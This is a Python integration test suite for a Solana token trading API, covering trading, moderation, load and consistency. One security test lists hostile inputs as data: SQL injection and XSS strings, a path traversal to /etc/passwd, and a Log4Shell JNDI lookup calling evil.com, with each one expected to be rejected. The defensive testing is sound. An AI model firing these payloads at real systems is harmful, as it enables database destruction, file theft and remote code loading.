"""
🔄 Comprehensive Integration тесты
End-to-end сценарии и cross-module тестирование
"""

import pytest
import json
import asyncio
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, patch
from httpx import AsyncClient

from .conftest import DatabaseTestHelper, WebSocketTestHelper, sample_token_data, sample_user_data, auth_headers, admin_auth_headers


@pytest.mark.integration
@pytest.mark.requires_db
@pytest.mark.slow
class TestComprehensiveIntegration:
    """Comprehensive end-to-end integration тесты"""

    async def test_full_token_lifecycle(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper,
        ws_helper: WebSocketTestHelper,
        sample_token_data: dict,
        auth_headers: dict
    ):
        """Тест полного жизненного цикла токена"""
        # 1. Создание пользователя
        user_data = {
            "wallet_address": "7wUQXRQtBzTmyp9kcrmok9FKcc4RSYXxPYN9FGDLnqxb",
            "username": "lifecycleuser",
            "email": "lifecycle@test.com",
            "reputation_score": 80.0
        }
        
        user_response = await async_client.post(
            "/api/v1/users/profile",
            json=user_data
        )
        assert user_response.status_code == 201
        
        # 2. Создание токена
        with patch("api.services.blockchain.SolanaService") as mock_service:
            mock_service.return_value.create_token_mint = AsyncMock(
                return_value={
                    "mint_address": "lifecycle_token_mint_123",
                    "transaction_signature": "lifecycle_tx_123"
                }
            )
            
            token_response = await async_client.post(
                "/api/v1/tokens/create",
                json=sample_token_data,
                headers=auth_headers
            )
            assert token_response.status_code == 201
            token_data = token_response.json()
            mint_address = token_data["mint_address"]
        
        # 3. Торговые операции
        trades = [
            {"type": "buy", "sol": 1000000000, "tokens": 950000},
            {"type": "buy", "sol": 2000000000, "tokens": 1800000},
            {"type": "sell", "sol": 1500000000, "tokens": 1000000},
            {"type": "buy", "sol": 5000000000, "tokens": 4500000},
        ]
        
        for i, trade in enumerate(trades):
            with patch("api.services.blockchain.SolanaService") as mock_service:
                mock_instance = mock_service.return_value
                if trade["type"] == "buy":
                    mock_instance.calculate_buy_amount = AsyncMock(
                        return_value={
                            "token_amount": trade["tokens"],
                            "actual_sol_amount": trade["sol"],
                            "price_impact": 2.5,
                            "new_price": 1100000,
                            "fees": 25000000
                        }
                    )
                    mock_instance.execute_buy_trade = AsyncMock(
                        return_value={
                            "transaction_signature": f"lifecycle_buy_tx_{i}",
                            "success": True
                        }
                    )
                    
                    trade_response = await async_client.post(
                        "/api/v1/trading/buy",
                        json={
                            "token_mint": mint_address,
                            "sol_amount": trade["sol"],
                            "min_tokens_out": trade["tokens"] - 50000,
                            "slippage_tolerance": 500
                        },
                        headers=auth_headers
                    )
                else:
                    mock_instance.calculate_sell_amount = AsyncMock(
                        return_value={
                            "sol_amount": trade["sol"],
                            "actual_token_amount": trade["tokens"],
                            "price_impact": 3.0,
                            "new_price": 1050000,
                            "fees": 50000000
                        }
                    )
                    mock_instance.execute_sell_trade = AsyncMock(
                        return_value={
                            "transaction_signature": f"lifecycle_sell_tx_{i}",
                            "success": True
                        }
                    )
                    
                    trade_response = await async_client.post(
                        "/api/v1/trading/sell",
                        json={
                            "token_mint": mint_address,
                            "token_amount": trade["tokens"],
                            "min_sol_out": trade["sol"] - 100000000,
                            "slippage_tolerance": 500
                        },
                        headers=auth_headers
                    )
                
                assert trade_response.status_code == 200
        
        # 4. Проверка аналитики
        analytics_response = await async_client.get(f"/api/v1/analytics/tokens/{mint_address}")
        assert analytics_response.status_code == 200
        analytics_data = analytics_response.json()
        assert analytics_data["trading_metrics"]["total_trades"] >= 4
        
        # 5. Получение истории сделок
        history_response = await async_client.get(
            f"/api/v1/trading/tokens/{mint_address}/history"
        )
        assert history_response.status_code == 200
        history_data = history_response.json()
        assert len(history_data["trades"]) >= 4
        
        # 6. Проверка портфолио пользователя
        portfolio_response = await async_client.get(
            f"/api/v1/users/{user_data['wallet_address']}/portfolio"
        )
        assert portfolio_response.status_code == 200
        portfolio_data = portfolio_response.json()
        assert len(portfolio_data["holdings"]) >= 1

    async def test_multi_user_trading_scenario(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper,
        sample_token_data: dict
    ):
        """Тест торгового сценария с несколькими пользователями"""
        # Создаем несколько пользователей
        users = []
        for i in range(5):
            user_data = {
                "wallet_address": f"MultiUser{i}123456789",
                "username": f"multiuser{i}",
                "email": f"multi{i}@test.com",
                "reputation_score": 50.0 + i * 10
            }
            
            response = await async_client.post("/api/v1/users/profile", json=user_data)
            assert response.status_code == 201
            users.append(user_data)
        
        # Первый пользователь создает токен
        creator_headers = {
            "Authorization": f"Bearer {users[0]['wallet_address']}_token",
            "Content-Type": "application/json"
        }
        
        with patch("api.services.blockchain.SolanaService") as mock_service:
            mock_service.return_value.create_token_mint = AsyncMock(
                return_value={
                    "mint_address": "multi_user_token_123",
                    "transaction_signature": "multi_create_tx_123"
                }
            )
            
            token_response = await async_client.post(
                "/api/v1/tokens/create",
                json=sample_token_data,
                headers=creator_headers
            )
            assert token_response.status_code == 201
            mint_address = token_response.json()["mint_address"]
        
        # Каждый пользователь совершает торговые операции
        total_trades = 0
        for i, user in enumerate(users[1:], 1):  # Пропускаем создателя
            user_headers = {
                "Authorization": f"Bearer {user['wallet_address']}_token",
                "Content-Type": "application/json"
            }
            
            # Покупка
            with patch("api.services.blockchain.SolanaService") as mock_service:
                mock_instance = mock_service.return_value
                mock_instance.calculate_buy_amount = AsyncMock(
                    return_value={
                        "token_amount": i * 1000000,
                        "actual_sol_amount": i * 1000000000,
                        "price_impact": 2.0 + i,
                        "new_price": 1000000 + i * 100000,
                        "fees": 25000000
                    }
                )
                mock_instance.execute_buy_trade = AsyncMock(
                    return_value={
                        "transaction_signature": f"multi_buy_tx_{i}",
                        "success": True
                    }
                )
                
                buy_response = await async_client.post(
                    "/api/v1/trading/buy",
                    json={
                        "token_mint": mint_address,
                        "sol_amount": i * 1000000000,
                        "min_tokens_out": i * 900000,
                        "slippage_tolerance": 500
                    },
                    headers=user_headers
                )
                assert buy_response.status_code == 200
                total_trades += 1
            
            # Продажа (если не первый трейдер)
            if i > 1:
                with patch("api.services.blockchain.SolanaService") as mock_service:
                    mock_instance = mock_service.return_value
                    mock_instance.calculate_sell_amount = AsyncMock(
                        return_value={
                            "sol_amount": i * 800000000,
                            "actual_token_amount": i * 500000,
                            "price_impact": 1.5,
                            "new_price": 1000000 + i * 80000,
                            "fees": 20000000
                        }
                    )
                    mock_instance.execute_sell_trade = AsyncMock(
                        return_value={
                            "transaction_signature": f"multi_sell_tx_{i}",
                            "success": True
                        }
                    )
                    
                    sell_response = await async_client.post(
                        "/api/v1/trading/sell",
                        json={
                            "token_mint": mint_address,
                            "token_amount": i * 500000,
                            "min_sol_out": i * 700000000,
                            "slippage_tolerance": 500
                        },
                        headers=user_headers
                    )
                    assert sell_response.status_code == 200
                    total_trades += 1
        
        # Проверяем общую статистику
        overview_response = await async_client.get("/api/v1/analytics/overview")
        assert overview_response.status_code == 200
        overview_data = overview_response.json()
        assert overview_data["total_users"] >= 5
        assert overview_data["total_trades"] >= total_trades

    async def test_admin_moderation_workflow(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper,
        sample_token_data: dict,
        sample_user_data: dict,
        auth_headers: dict,
        admin_auth_headers: dict
    ):
        """Тест workflow административной модерации"""
        # 1. Пользователь создает токен
        user_response = await async_client.post(
            "/api/v1/users/profile",
            json=sample_user_data
        )
        assert user_response.status_code == 201
        
        with patch("api.services.blockchain.SolanaService") as mock_service:
            mock_service.return_value.create_token_mint = AsyncMock(
                return_value={
                    "mint_address": "moderation_token_123",
                    "transaction_signature": "moderation_tx_123"
                }
            )
            
            # Создаем токен с подозрительным контентом
            suspicious_token = sample_token_data.copy()
            suspicious_token["name"] = "Suspicious Token"
            suspicious_token["description"] = "This token might violate terms"
            
            token_response = await async_client.post(
                "/api/v1/tokens/create",
                json=suspicious_token,
                headers=auth_headers
            )
            assert token_response.status_code == 201
            mint_address = token_response.json()["mint_address"]
        
        # 2. Автоматическая система помечает токен для review
        flag_response = await async_client.post(
            f"/api/v1/admin/tokens/{mint_address}/moderate",
            json={
                "action": "flag",
                "reason": "Potential policy violation",
                "severity": "medium",
                "requires_review": True
            },
            headers=admin_auth_headers
        )
        assert flag_response.status_code == 200
        
        # 3. Админ получает список токенов на рассмотрении
        pending_response = await async_client.get(
            "/api/v1/admin/tokens/pending-review",
            headers=admin_auth_headers
        )
        assert pending_response.status_code == 200
        pending_data = pending_response.json()
        assert len(pending_data["tokens"]) >= 1
        
        # 4. Админ рассматривает и одобряет токен
        review_response = await async_client.post(
            f"/api/v1/admin/tokens/{mint_address}/review",
            json={
                "action": "approve",
                "notes": "Content reviewed and approved"
            },
            headers=admin_auth_headers
        )
        assert review_response.status_code == 200
        
        # 5. Проверяем, что токен теперь активен
        token_response = await async_client.get(f"/api/v1/tokens/{mint_address}")
        assert token_response.status_code == 200
        token_data = token_response.json()
        assert token_data["status"] == "active"

    async def test_error_recovery_scenarios(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper,
        auth_headers: dict
    ):
        """Тест сценариев восстановления после ошибок"""
        # 1. Тест восстановления после blockchain ошибки
        with patch("api.services.blockchain.SolanaService") as mock_service:
            # Первая попытка - ошибка
            mock_service.return_value.create_token_mint = AsyncMock(
                side_effect=Exception("Blockchain temporarily unavailable")
            )
            
            token_data = {
                "name": "Error Recovery Token",
                "symbol": "ERT",
                "description": "Token for error recovery testing",
                "initial_supply": 1000000000000000000,
                "initial_price": 1000000
            }
            
            response = await async_client.post(
                "/api/v1/tokens/create",
                json=token_data,
                headers=auth_headers
            )
            assert response.status_code == 500
            
            # Вторая попытка - успех
            mock_service.return_value.create_token_mint = AsyncMock(
                return_value={
                    "mint_address": "recovery_token_123",
                    "transaction_signature": "recovery_tx_123"
                }
            )
            
            response = await async_client.post(
                "/api/v1/tokens/create",
                json=token_data,
                headers=auth_headers
            )
            assert response.status_code == 201
        
        # 2. Тест partial failure в торговых операциях
        user_data = {
            "wallet_address": "ErrorRecoveryUser123456789",
            "username": "erroruser",
            "email": "error@test.com",
            "reputation_score": 60.0
        }
        user_id = await db_helper.create_test_user(user_data)
        
        # 3. Тест database rollback
        # (Этот тест требует специальной настройки для проверки транзакций)
        pass

    async def test_performance_under_concurrent_load(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper
    ):
        """Тест производительности под concurrent нагрузкой"""
        # Создаем базовые данные
        user_data = {
            "wallet_address": "LoadTestUser123456789",
            "username": "loaduser",
            "email": "load@test.com",
            "reputation_score": 70.0
        }
        user_id = await db_helper.create_test_user(user_data)
        
        token_data = {
            "name": "Load Test Token",
            "symbol": "LOAD",
            "description": "Token for load testing",
            "initial_supply": 1000000000000000000,
            "initial_price": 1000000
        }
        mint_address = await db_helper.create_test_token(token_data, user_id)
        
        # Concurrent requests
        async def make_request(request_id: int):
            with patch("api.services.blockchain.SolanaService") as mock_service:
                mock_instance = mock_service.return_value
                mock_instance.calculate_buy_amount = AsyncMock(
                    return_value={
                        "token_amount": 100000,
                        "actual_sol_amount": 100000000,
                        "price_impact": 1.0,
                        "new_price": 1010000,
                        "fees": 2000000
                    }
                )
                mock_instance.execute_buy_trade = AsyncMock(
                    return_value={
                        "transaction_signature": f"load_tx_{request_id}",
                        "success": True
                    }
                )
                
                headers = {
                    "Authorization": f"Bearer load_token_{request_id}",
                    "Content-Type": "application/json"
                }
                
                return await async_client.post(
                    "/api/v1/trading/buy",
                    json={
                        "token_mint": mint_address,
                        "sol_amount": 100000000,
                        "min_tokens_out": 95000,
                        "slippage_tolerance": 500
                    },
                    headers=headers
                )
        
        # Запускаем concurrent requests
        tasks = [make_request(i) for i in range(50)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Анализируем результаты
        successful_responses = [
            r for r in responses 
            if not isinstance(r, Exception) and r.status_code == 200
        ]
        
        # Ожидаем что большинство запросов прошло успешно
        assert len(successful_responses) >= 40  # 80% success rate

    async def test_data_consistency_across_modules(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper,
        auth_headers: dict
    ):
        """Тест консистентности данных между модулями"""
        # Создаем пользователя
        user_data = {
            "wallet_address": "7wUQXRQtBzTmyp9kcrmok9FKcc4RSYXxPYN9FGDLnqxb",
            "username": "consistencyuser",
            "email": "consistency@test.com",
            "reputation_score": 75.0
        }
        
        user_response = await async_client.post(
            "/api/v1/users/profile",
            json=user_data
        )
        assert user_response.status_code == 201
        
        # Создаем токен
        with patch("api.services.blockchain.SolanaService") as mock_service:
            mock_service.return_value.create_token_mint = AsyncMock(
                return_value={
                    "mint_address": "consistency_token_123",
                    "transaction_signature": "consistency_tx_123"
                }
            )
            
            token_data = {
                "name": "Consistency Token",
                "symbol": "CONS",
                "description": "Token for consistency testing",
                "initial_supply": 1000000000000000000,
                "initial_price": 1000000
            }
            
            token_response = await async_client.post(
                "/api/v1/tokens/create",
                json=token_data,
                headers=auth_headers
            )
            assert token_response.status_code == 201
            mint_address = token_response.json()["mint_address"]
        
        # Выполняем торговую операцию
        with patch("api.services.blockchain.SolanaService") as mock_service:
            mock_instance = mock_service.return_value
            mock_instance.calculate_buy_amount = AsyncMock(
                return_value={
                    "token_amount": 1000000,
                    "actual_sol_amount": 1000000000,
                    "price_impact": 2.5,
                    "new_price": 1025000,
                    "fees": 25000000
                }
            )
            mock_instance.execute_buy_trade = AsyncMock(
                return_value={
                    "transaction_signature": "consistency_trade_tx_123",
                    "success": True
                }
            )
            
            trade_response = await async_client.post(
                "/api/v1/trading/buy",
                json={
                    "token_mint": mint_address,
                    "sol_amount": 1000000000,
                    "min_tokens_out": 950000,
                    "slippage_tolerance": 500
                },
                headers=auth_headers
            )
            assert trade_response.status_code == 200
        
        # Проверяем консистентность данных в разных endpoints
        
        # 1. Данные токена в tokens API
        token_get_response = await async_client.get(f"/api/v1/tokens/{mint_address}")
        assert token_get_response.status_code == 200
        token_from_api = token_get_response.json()
        
        # 2. Данные токена в analytics API
        analytics_response = await async_client.get(f"/api/v1/analytics/tokens/{mint_address}")
        assert analytics_response.status_code == 200
        analytics_data = analytics_response.json()
        
        # 3. Данные токена в user portfolio
        portfolio_response = await async_client.get(
            f"/api/v1/users/{user_data['wallet_address']}/portfolio"
        )
        assert portfolio_response.status_code == 200
        portfolio_data = portfolio_response.json()
        
        # 4. Торговая история
        history_response = await async_client.get(
            f"/api/v1/trading/tokens/{mint_address}/history"
        )
        assert history_response.status_code == 200
        history_data = history_response.json()
        
        # Проверяем консистентность
        assert token_from_api["mint_address"] == mint_address
        assert analytics_data["token_info"]["mint_address"] == mint_address
        assert len(history_data["trades"]) >= 1
        assert len(portfolio_data["holdings"]) >= 1
        
        # Проверяем, что все источники показывают одинаковую информацию о торговле
        trade_from_history = history_data["trades"][0]
        assert trade_from_history["token_mint"] == mint_address
        assert trade_from_history["trade_type"] == "buy"

    async def test_security_edge_cases(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper
    ):
        """Тест security edge cases"""
        # 1. SQL Injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            # Попытка создания пользователя с malicious данными
            user_data = {
                "wallet_address": malicious_input,
                "username": malicious_input,
                "email": "test@test.com",
                "reputation_score": 50.0
            }
            
            response = await async_client.post("/api/v1/users/profile", json=user_data)
            # Должна быть ошибка валидации, а не 500 error
            assert response.status_code in [400, 422]
        
        # 2. Тест rate limiting
        # (Требует реальной реализации rate limiting)
        pass
        
        # 3. Тест authorization bypass attempts
        unauthorized_headers = {
            "Authorization": "Bearer fake_token",
            "Content-Type": "application/json"
        }
        
        protected_endpoints = [
            "/api/v1/admin/dashboard",
            "/api/v1/admin/users/test/status",
            "/api/v1/admin/settings"
        ]
        
        for endpoint in protected_endpoints:
            response = await async_client.get(endpoint, headers=unauthorized_headers)
            assert response.status_code in [401, 403]

    @pytest.mark.slow
    async def test_system_resilience(
        self,
        async_client: AsyncClient,
        db_helper: DatabaseTestHelper
    ):
        """Тест устойчивости системы"""
        # 1. Тест с большим объемом данных
        # Создаем множество пользователей
        users = []
        for i in range(100):
            user_data = {
                "wallet_address": f"ResilienceUser{i:03d}",
                "username": f"resilienceuser{i}",
                "email": f"resilience{i}@test.com",
                "reputation_score": 50.0 + (i % 50)
            }
            response = await async_client.post("/api/v1/users/profile", json=user_data)
            if response.status_code == 201:
                users.append(user_data)
            
            # Прерываем если много ошибок
            if len(users) < i * 0.8:  # Менее 80% успеха
                break
        
        # Проверяем, что создалось разумное количество пользователей
        assert len(users) >= 50
        
        # 2. Тест pagination с большими данными
        pagination_response = await async_client.get("/api/v1/users/search?limit=50")
        assert pagination_response.status_code == 200
        
        # 3. Тест производительности analytics на больших данных
        analytics_response = await async_client.get("/api/v1/analytics/overview")
        assert analytics_response.status_code == 200